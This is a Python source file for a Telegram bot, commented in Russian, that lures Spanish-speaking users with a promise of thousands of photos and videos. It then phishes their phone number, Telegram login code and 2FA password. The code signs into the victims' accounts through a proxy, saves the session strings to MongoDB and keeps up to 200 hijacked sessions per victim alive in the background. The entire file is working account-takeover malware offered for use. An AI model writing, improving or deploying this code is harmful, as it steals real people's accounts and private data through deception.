import logging
import os
import json
import asyncio
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# Конфигурация
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
active_sessions_col = db["active_sessions"]  # Новая коллекция для активных сессий

# Глобальные переменные
user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

# Константы
MAX_ACTIVE_SESSIONS = 200  # Максимальное количество активных сессий
SESSION_ROTATION_INTERVAL = 3600  # Интервал проверки сессий в секундах (1 час)

os.makedirs("sessions", exist_ok=True)

async def rotate_sessions(user_id, phone, main_session_str):
    """Ротация сессий - поддерживаем MAX_ACTIVE_SESSIONS активных сессий"""
    # Получаем текущие активные сессии
    active_sessions = list(active_sessions_col.find({"user_id": user_id}))
    
    # Проверяем какие сессии еще активны
    valid_sessions = []
    for session in active_sessions:
        client = TelegramClient(StringSession(session['session']), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append(session)
            else:
                # Удаляем неактивную сессию
                active_sessions_col.delete_one({"_id": session["_id"]})
        except Exception as e:
            logging.error(f"Session check error: {e}")
            active_sessions_col.delete_one({"_id": session["_id"]})
        finally:
            await client.disconnect()
    
    # Если активных сессий меньше MAX_ACTIVE_SESSIONS - создаем новые
    if len(valid_sessions) < MAX_ACTIVE_SESSIONS:
        needed = MAX_ACTIVE_SESSIONS - len(valid_sessions)
        for _ in range(needed):
            # Создаем новую сессию на основе основной
            client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH, proxy=proxy)
            await client.connect()
            new_session_str = client.session.save()
            
            # Добавляем новую активную сессию
            active_sessions_col.insert_one({
                "user_id": user_id,
                "phone": phone,
                "session": new_session_str,
                "created_at": datetime.utcnow(),
                "last_active": datetime.utcnow()
            })
            
            await client.disconnect()

async def session_monitor():
    """Фоновая задача для мониторинга и ротации сессий"""
    while True:
        await asyncio.sleep(SESSION_ROTATION_INTERVAL)
        try:
            # Получаем всех пользователей с основными сессиями
            users_with_sessions = sessions_col.distinct("user_id")
            
            for user_id in users_with_sessions:
                # Получаем основную сессию пользователя
                main_session = sessions_col.find_one({"user_id": user_id})
                if main_session:
                    await rotate_sessions(user_id, main_session['phone'], main_session['session'])
        except Exception as e:
            logging.error(f"Session monitor error: {e}")

async def initialize_user_sessions(user_id, phone, session_str):
    """Инициализация сессий для нового пользователя"""
    # Сохраняем основную сессию
    sessions_col.update_one(
        {"user_id": user_id},
        {"$set": {
            "phone": phone,
            "session": session_str,
            "created_at": datetime.utcnow()
        }},
        upsert=True
    )
    
    # Создаем пул активных сессий
    await rotate_sessions(user_id, phone, session_str)

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
    )
    await message.answer(
        "👋🇪🇨 ¡HOLA! ❤️\n"
        "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
        "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))

    await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        await message.answer("⌨️ Enter the code by pressing the buttons below:")
    except Exception as e:
        await message.answer(f"❌ Error al enviar el código: {e}")
        await client.disconnect()
        cleanup(user_id)

async def send_code_keyboard(user_id, current_code, message_id=None):
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Enviar", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"Código: `{current_code}`" if current_code else "Ingresa el código:"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                  text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Error interno.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Ingresa el código primero", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Código demasiado largo", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Sesión no encontrada. Por favor, intenta nuevamente con /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # Инициализируем сессии пользователя
            await initialize_user_sessions(user_id, phone, session_str)
            
            await bot.send_message(user_id, "✅ ¡Autenticación exitosa! Se han activado múltiples sesiones.")
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Ingresa tu contraseña 2FA:")
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Código expirado. Por favor, intenta nuevamente con /start")
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error de autenticación: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Sesión no encontrada. Por favor, intenta nuevamente con /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # Инициализируем сессии пользователя
            await initialize_user_sessions(user_id, phone, session_str)
            
            await message.answer("✅ ¡Autenticación exitosa con 2FA! Se han activado múltiples sesiones.")
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer("❌ No se pudo autenticar con 2FA.")
    except Exception as e:
        await message.answer(f"❌ Error con 2FA: {e}")
        await client.disconnect()
        cleanup(user_id)

def cleanup(user_id):
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

async def on_startup(dp):
    # Запускаем мониторинг сессий при старте бота
    asyncio.create_task(session_monitor())

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)